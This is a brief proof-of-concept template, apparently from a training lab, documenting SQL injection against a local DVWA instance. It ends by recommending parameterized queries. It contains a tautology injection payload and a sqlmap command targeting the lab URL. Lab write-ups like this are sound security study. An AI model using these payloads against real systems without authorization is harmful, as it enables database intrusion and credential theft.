# Vulnerability PoC — DVWA SQLi

**Target:** http://localhost:8000/dvwa/  
**Date:** YYYY-MM-DD  
**Author:** Job Kinara — https://github.com/Ranks123

## 1) Summary
SQL Injection in `<parameter/cookie>` allowing data extraction (admin password).

## 2) Reproduction / PoC
- Manual example payload (adjust as needed):


http://127.0.0.1:8000/dvwa/vulnerabilities/sqli/?id=1

' OR '1'='1' --

- sqlmap example:

python3 ~/sqlmap/sqlmap.py -u "http://127.0.0.1:8000/dvwa/vulnerabilities/sqli/?id=1

" --batch


## 3) Impact
Admin credentials disclosure → account takeover.

## 4) Remediation
Use parameterized queries / prepared statements.

## 5) Artifacts
- screenshots/dvwa-poc.png
- demo.mp4
